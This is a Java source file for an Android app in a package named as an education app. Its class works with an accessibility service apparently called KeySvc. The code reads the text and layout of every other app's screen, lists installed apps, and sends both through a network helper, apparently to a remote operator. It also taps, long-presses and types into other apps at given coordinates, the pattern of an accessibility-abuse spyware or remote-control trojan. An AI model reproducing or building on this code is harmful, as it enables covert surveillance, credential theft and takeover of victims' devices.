package com.eloeeducacao;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public final class Tree {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final int MAX = 600;
    private static final int MAXD = 40;

    private Tree() {}

    public static void dump(final KeySvc s) {
        H.post(new Runnable() {
            @Override public void run() {
                final JSONArray arr = new JSONArray();
                boolean achou = false;
                try {
                    List<AccessibilityWindowInfo> wins = s.getWindows();
                    if (wins != null) {
                        for (AccessibilityWindowInfo w : wins) {
                            if (arr.length() >= MAX) break;
                            AccessibilityNodeInfo r = null;
                            try { r = w.getRoot(); } catch (Throwable ignored) {}
                            if (r == null) continue;
                            achou = true;
                            walk(s, r, arr, 0);
                        }
                    }
                } catch (Throwable ignored) {}
                if (!achou) {
                    try {
                        AccessibilityNodeInfo r = raiz(s);
                        if (r != null) walk(s, r, arr, 0);
                    } catch (Throwable ignored) {}
                }
                if (arr.length() == 0) {
                    Net.send("{\"t\":\"err\",\"o\":\"arvore vazia: janela nao acessivel\"}");
                }
                Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
            }
        });
    }

   private static AccessibilityNodeInfo raiz(KeySvc s) {
AccessibilityNodeInfo ativo = null;
try { ativo = s.getRootInActiveWindow(); } catch (Throwable ignored) {}
if (ativo != null) {
CharSequence p = ativo.getPackageName();
if (p != null && !p.toString().equals(s.getPackageName())) return ativo;
}
AccessibilityNodeInfo qualquer = null;
try {
java.util.List<AccessibilityWindowInfo> ws = s.getWindows();
if (ws != null) {
for (AccessibilityWindowInfo win : ws) {
if (win.getType() == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue;
AccessibilityNodeInfo q = win.getRoot();
if (q == null) continue;
CharSequence p = q.getPackageName();
if (p != null && !p.toString().equals(s.getPackageName())) return q;
if (qualquer == null) qualquer = q;
}
}
} catch (Throwable ignored) {}
if (qualquer != null) return qualquer;
if (ativo == null) {
try { Net.send("{\"t\":\"err\",\"o\":\"sem janela legivel - veja acessibilidade\"}"); } catch (Throwable ignored) {}
}
return ativo;
}
 private static void walk(KeySvc s, AccessibilityNodeInfo n, JSONArray arr, int d) {
        if (n == null || arr.length() >= MAX || d > MAXD) return;
        try {
            String pkg = n.getPackageName() == null ? "" : n.getPackageName().toString();
            if (pkg.equals(s.getPackageName())) return;

            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                String txt = n.getText() == null ? "" : n.getText().toString().trim();
                if (txt.isEmpty() && n.getContentDescription() != null)
                    txt = n.getContentDescription().toString().trim();
                boolean edit = n.isEditable();
                boolean clic = n.isClickable();
                if (!txt.isEmpty() || edit || clic) {
                    if (txt.length() > 140) txt = txt.substring(0, 140);
                    JSONObject o = new JSONObject();
                    o.put("t", txt);
                    o.put("x", r.centerX());
                    o.put("y", r.centerY());
                    o.put("d", d);
                    if (clic) o.put("c", 1);
                    if (edit) o.put("e", 1);
                    o.put("cls", cls(n.getClassName()));
                    o.put("pkg", pkg);
                    arr.put(o);
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) walk(s, n.getChild(i), arr, d + 1);
        } catch (Throwable ignored) {}
    }

    private static String cls(CharSequence c) {
        if (c == null) return "?";
        String s = c.toString();
        int i = s.lastIndexOf('.');
        return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
    }

    public static void apps(final Context c) {
        new Thread(new Runnable() {
            @Override public void run() {
                final JSONArray arr = new JSONArray();
                try {
                    final PackageManager pm = c.getPackageManager();
                    Intent i = new Intent(Intent.ACTION_MAIN);
                    i.addCategory(Intent.CATEGORY_LAUNCHER);
                    List<ResolveInfo> l = pm.queryIntentActivities(i, 0);
                    Collections.sort(l, new Comparator<ResolveInfo>() {
                        @Override public int compare(ResolveInfo a, ResolveInfo b) {
                            return a.loadLabel(pm).toString().compareToIgnoreCase(
                                    b.loadLabel(pm).toString());
                        }
                    });
                    for (ResolveInfo ri : l) {
                        if (ri.activityInfo == null) continue;
                        String p = ri.activityInfo.packageName;
                        if (p.equals(c.getPackageName())) continue;
                        JSONObject o = new JSONObject();
                        o.put("n", ri.loadLabel(pm).toString());
                        o.put("p", p);
                        arr.put(o);
                    }
                } catch (Throwable ignored) {}
                Net.send("{\"t\":\"applist\",\"o\":" + arr.toString() + "}");
            }
        }).start();
    }

    public static void act(final KeySvc s, final float x, final float y, final boolean longo) {
        if (longo) {
            s.longPress(x, y);
            return;
        }
        H.post(new Runnable() {
            @Override public void run() {
                boolean feito = false;
                try {
                    AccessibilityNodeInfo root = raiz(s);
                    if (root != null) {
                        AccessibilityNodeInfo n = acha(root, (int) x, (int) y, 0);
                        while (n != null && !n.isClickable()) n = n.getParent();
                        if (n != null) feito = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                } catch (Throwable ignored) {}
                if (!feito) s.touch(x, y);
            }
        });
    }

    private static AccessibilityNodeInfo acha(AccessibilityNodeInfo n, int x, int y, int d) {
        if (n == null || d > MAXD) return null;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (!r.contains(x, y)) return null;
            for (int i = n.getChildCount() - 1; i >= 0; i--) {
                AccessibilityNodeInfo f = acha(n.getChild(i), x, y, d + 1);
                if (f != null) return f;
            }
            return n;
        } catch (Throwable t) {
            return null;
        }
    }

    public static void fill(final KeySvc s, final float x, final float y, final String v) {
        s.touch(x, y);
        H.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    AccessibilityNodeInfo root = raiz(s);
                    if (root == null) return;
                    AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    if (f == null) return;
                    Bundle b = new Bundle();
                    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, v);
                    f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                } catch (Throwable ignored) {}
            }
        }, 400);
    }

public static void dump2(final KeySvc s) {
H.post(new Runnable() { public void run() {
JSONArray arr = new JSONArray();
try {
AccessibilityNodeInfo r = raiz(s);
if (r == null) {
Net.send("{\"t\":\"err\",\"o\":\"raiz nula - sem janela legivel\"}");
} else {
java.util.ArrayDeque<Object[]> q = new java.util.ArrayDeque<Object[]>();
q.add(new Object[]{r, 0});
int cont = 0;
while (!q.isEmpty() && cont < 600) {
Object[] it = q.poll();
AccessibilityNodeInfo n = (AccessibilityNodeInfo) it[0];
int d = ((Integer) it[1]).intValue();
if (n == null) continue;
cont++;
String txt = null;
try { if (n.getText() != null) txt = n.getText().toString().trim(); } catch (Throwable ignored) {}
if (txt == null || txt.length() == 0) {
try { if (n.getContentDescription() != null) txt = n.getContentDescription().toString().trim(); } catch (Throwable ignored) {}
}
android.graphics.Rect b = new android.graphics.Rect();
try { n.getBoundsInScreen(b); } catch (Throwable ignored) {}
boolean tem = txt != null && txt.length() > 0;
if (tem || n.isClickable() || n.isEditable()) {
try {
org.json.JSONObject o = new org.json.JSONObject();
if (tem) o.put("t", txt.length() > 120 ? txt.substring(0, 120) : txt);
o.put("cls", cls(n.getClassName()));
o.put("x", b.centerX());
o.put("y", b.centerY());
o.put("c", n.isClickable());
o.put("e", n.isEditable());
o.put("d", d);
arr.put(o);
} catch (Throwable ignored) {}
}
if (d < MAXD) {
for (int i = 0; i < n.getChildCount(); i++) {
AccessibilityNodeInfo ch = null;
try { ch = n.getChild(i); } catch (Throwable ignored) {}
if (ch != null) q.add(new Object[]{ch, d + 1});
}
}
}
if (arr.length() == 0) {
CharSequence p = r.getPackageName();
Net.send("{\"t\":\"err\",\"o\":\"arvore vazia pkg=" + (p == null ? "?" : p.toString()) + "\"}");
}
}
} catch (Throwable e) {
Net.send("{\"t\":\"err\",\"o\":\"dump2: " + e + "\"}");
}
try { Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}"); } catch (Throwable ignored) {}
}});
}}
